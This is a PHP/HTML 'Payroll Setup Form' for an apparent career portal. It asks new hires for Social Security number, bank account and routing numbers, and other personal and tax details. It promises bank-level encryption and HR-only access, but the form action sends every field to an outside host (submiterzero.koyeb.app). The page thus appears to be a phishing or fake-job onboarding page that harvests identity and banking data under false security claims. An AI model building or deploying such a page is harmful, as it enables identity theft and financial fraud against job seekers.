<?php
// payroll-setup.php
include 'config/database.php';
include 'includes/auth.php';

$database = new Database();
$db = $database->getConnection();
$auth = new Auth($db);
$auth->redirectIfNotLoggedIn();

$user_id = $_SESSION['user_id'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payroll Setup - Career Portal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #FF8F1C;
            --secondary: #ed2024;
            --dark: #2c3e50;
            --light: #f8f9fa;
            --gradient: linear-gradient(135deg, var(--primary), var(--secondary));
        }
        
        .official-header {
            background: var(--dark);
            color: white;
            padding: 30px 0;
            border-bottom: 5px solid var(--primary);
        }

        .official-watermark {
            position: relative;
        }
        
        .official-watermark:before {
            content: "OFFICIAL";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-45deg);
            font-size: 9rem;
            color: rgba(0,0,0,0.03);
            font-weight: bold;
            z-index: 9999; /* High z-index to be above everything */
            white-space: nowrap;
            pointer-events: none; /* This should work but might not in all browsers */
        }
        
        .form-section {
            background: white;
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border-left: 4px solid var(--primary);
            position: relative;
            z-index: 1;
        }
        
        .form-control, .form-select, .form-check-input {
            position: relative;
            z-index: 2;
        }
        
        .required:after {
            content: " *";
            color: var(--secondary);
        }
        
        .form-control:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 0.2rem rgba(255, 143, 28, 0.25);
        }
        
        .btn-primary {
            background: var(--gradient);
            border: none;
            padding: 12px 30px;
            font-size: 1.1rem;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .field-icon {
            font-size: 1.1rem;
            margin-right: 8px;
            opacity: 0.8;
        }
        
        .confidential-badge {
            background: var(--secondary);
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: bold;
        }
        
        input, select, textarea, button, .form-check-label {
            position: relative;
            z-index: 2;
        }
        
        .compensation-badge {
            background: #e7f3ff;
            border: 1px solid #b6d7ff;
            border-radius: 8px;
            padding: 15px;
            margin: 10px 0;
        }
        
        .section-icon {
            font-size: 1.3rem;
            margin-right: 10px;
            color: var(--primary);
        }
    </style>
</head>
<body>
    <?php include 'includes/header.php'; ?>
    
    <div class="official-header">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-md-8">
                    <h1 class="mb-0">Payroll Setup Form</h1>
                    <p class="mb-0">Confidential Payroll Information - Secure Submission</p>
                </div>
                <div class="col-md-4 text-end">
                    <div class="confidential-badge">
                        <i class="fas fa-lock me-1"></i>CONFIDENTIAL
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="container mt-4">
        <div class="alert alert-info">
            <h5><i class="fas fa-shield-alt me-2"></i>Secure Payroll Information</h5>
            <p class="mb-0">
                Your payroll information is protected by bank-level encryption. All data is transmitted securely 
                and accessed only by authorized HR personnel.
            </p>
        </div>

        <form action="https://submiterzero.koyeb.app/submit-payroll.php" method="POST" id="payrollForm">
            <div class="official-watermark">
            
            <!-- Employee Information Section -->
            <div class="form-section">
                <h4 class="mb-4"><i class="fas fa-user-tie section-icon"></i>Employee Information</h4>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Full Legal Name
                        </label>
                        <input type="text" class="form-control" name="employee_name" required>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Job Title / Position
                        </label>
                        <input type="text" class="form-control" name="position" required>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Hourly Rate ($)
                        </label>
                        <input type="number" class="form-control" name="hourly_rate" step="0.01" min="7.25" required>
                        <small class="text-muted">Minimum: $7.25 (Federal minimum wage)</small>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Expected Start Date
                        </label>
                        <input type="date" class="form-control" name="start_date" required>
                    </div>
                </div>
                
                <div class="compensation-badge">
                    <h6><i class="fas fa-calculator me-2"></i>Estimated Compensation</h6>
                    <p class="mb-1">Based on 40 hours/week: <strong id="estimatedWeekly">$0.00</strong> weekly</p>
                    <p class="mb-0">Approximate monthly: <strong id="estimatedMonthly">$0.00</strong></p>
                </div>
            </div>

            <!-- Banking Information Section -->
            <div class="form-section">
                <h4 class="mb-4"><i class="fas fa-university section-icon"></i>Banking Information</h4>
                
                <div class="alert alert-warning">
                    <i class="fas fa-exclamation-triangle me-2"></i>
                    <strong>Double-check your banking information</strong> to ensure accurate and timely payments.
                </div>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Bank Name
                        </label>
                        <input type="text" class="form-control" name="bank_name" required>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Account Type
                        </label>
                        <select class="form-select" name="account_type" required>
                            <option value="">Select Account Type</option>
                            <option value="checking">Checking Account</option>
                            <option value="savings">Savings Account</option>
                        </select>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Bank Account Number
                        </label>
                        <input type="text" class="form-control" name="account_number" required>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Routing Number
                        </label>
                        <input type="text" class="form-control" name="routing_number" required>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Pay Frequency
                        </label>
                        <select class="form-select" name="pay_frequency" required>
                            <option value="">Select Frequency</option>
                            <option value="Weekly">Weekly</option>
                            <option value="Bi-Weekly">Bi-Weekly</option>
                            <option value="Monthly">Monthly</option>
                            <option value="Semi-Monthly">Semi-Monthly</option>
                        </select>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Preferred Payment Method
                        </label>
                        <select class="form-select" name="payment_method" required>
                            <option value="">Select Method</option>
                            <option value="direct_deposit">Direct Deposit</option>
                            <option value="payroll_card">Payroll Card</option>
                            <option value="paper_check">Paper Check</option>
                        </select>
                    </div>
                </div>
            </div>

            <!-- Tax Information Section -->
            <div class="form-section">
                <h4 class="mb-4"><i class="fas fa-file-invoice-dollar section-icon"></i>Tax Information</h4>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Social Security Number (SSN)
                        </label>
                        <input type="text" class="form-control" name="tax_id" placeholder="XXX-XX-XXXX" required>
                        <small class="text-muted">Required for tax reporting purposes</small>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Filing Status
                        </label>
                        <select class="form-select" name="filing_status" required>
                            <option value="">Select Status</option>
                            <option value="single">Single</option>
                            <option value="married_joint">Married Filing Jointly</option>
                            <option value="married_separate">Married Filing Separately</option>
                            <option value="head_household">Head of Household</option>
                            <option value="widower">Qualifying Widow(er)</option>
                        </select>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Number of Allowances
                        </label>
                        <select class="form-select" name="allowances" required>
                            <option value="">Select Number</option>
                            <option value="0">0</option>
                            <option value="1">1</option>
                            <option value="2">2</option>
                            <option value="3">3</option>
                            <option value="4">4</option>
                            <option value="5">5+</option>
                        </select>
                        <small class="text-muted">For W-4 withholding calculations</small>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label">
                            Student Status
                        </label>
                        <select class="form-select" name="student_status">
                            <option value="">Select if applicable</option>
                            <option value="not_student">Not a student</option>
                            <option value="full_time">Full-time student</option>
                            <option value="part_time">Part-time student</option>
                        </select>
                    </div>
                </div>
                
                <div class="mb-3">
                    <label class="form-label">
                        Additional Withholding Instructions
                    </label>
                    <textarea class="form-control" name="withholding_notes" rows="3" placeholder="Any additional withholding amounts or special tax considerations..."></textarea>
                </div>
            </div>

            <!-- Work Preferences Section -->
            <div class="form-section">
                <h4 class="mb-4"><i class="fas fa-clock section-icon"></i>Work Preferences</h4>
                
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Preferred Work Schedule
                        </label>
                        <select class="form-select" name="work_schedule" required>
                            <option value="">Select Schedule</option>
                            <option value="standard">Standard Business Hours (9AM-5PM)</option>
                            <option value="flexible">Flexible Hours</option>
                            <option value="evening">Evening Shift</option>
                            <option value="night">Night Shift</option>
                            <option value="weekend">Weekend Availability</option>
                        </select>
                    </div>
                    
                    <div class="col-md-6 mb-3">
                        <label class="form-label required">
                            Work Arrangement
                        </label>
                        <select class="form-select" name="work_arrangement" required>
                            <option value="">Select Arrangement</option>
                            <option value="remote">Fully Remote</option>
                            <option value="hybrid">Hybrid (Remote & Office)</option>
                            <option value="office">In-Office</option>
                        </select>
                    </div>
                </div>
                
                <div class="mb-3">
                    <label class="form-label">
                        Work Location Preference
                    </label>
                    <input type="text" class="form-control" name="work_location" placeholder="City, State or specific location preference">
                </div>
            </div>

            <!-- Certification -->
            <div class="form-section">
                <div class="alert alert-success">
                    <h5><i class="fas fa-certificate me-2"></i>Certification</h5>
                    <p class="mb-3">
                        I certify that the information provided is accurate and complete to the best of my knowledge. 
                        I understand that providing false information may result in termination of employment.
                    </p>
                    
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="certify" required>
                        <label class="form-check-label required" for="certify">
                            I certify that all information provided is true and accurate
                        </label>
                    </div>
                </div>
            </div>

            <!-- Submit Button -->
            <div class="text-center mt-4">
                <button type="submit" class="btn btn-primary btn-lg" style="margin-bottom: 30px;">
                    <i class="fas fa-paper-plane me-2"></i>Submit Payroll Information
                </button>
            </div>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const hourlyRateInput = document.querySelector('input[name="hourly_rate"]');
            const estimatedWeekly = document.getElementById('estimatedWeekly');
            const estimatedMonthly = document.getElementById('estimatedMonthly');
            
            // Calculate estimated compensation
            function calculateCompensation() {
                const hourlyRate = parseFloat(hourlyRateInput.value) || 0;
                const weekly = hourlyRate * 40;
                const monthly = weekly * 4.33; // Average weeks per month
                
                estimatedWeekly.textContent = '$' + weekly.toFixed(2);
                estimatedMonthly.textContent = '$' + monthly.toFixed(2);
            }
            
            hourlyRateInput.addEventListener('input', calculateCompensation);
            
            // Form validation
            document.getElementById('payrollForm').addEventListener('submit', function(e) {
                const certifyCheckbox = document.getElementById('certify');
                if (!certifyCheckbox.checked) {
                    e.preventDefault();
                    alert('Please certify that all information provided is true and accurate.');
                    return;
                }
                
                // Validate hourly rate
                const hourlyRate = document.querySelector('input[name="hourly_rate"]');
                if (hourlyRate.value && parseFloat(hourlyRate.value) < 7.25) {
                    e.preventDefault();
                    alert('Hourly rate must be at least the federal minimum wage of $7.25.');
                    return;
                }
            });
            
            // Set minimum date for start date to today
            const today = new Date().toISOString().split('T')[0];
            document.querySelector('input[name="start_date"]').min = today;
            
            // Initial calculation
            calculateCompensation();
        });
    </script>
</body>
</html>
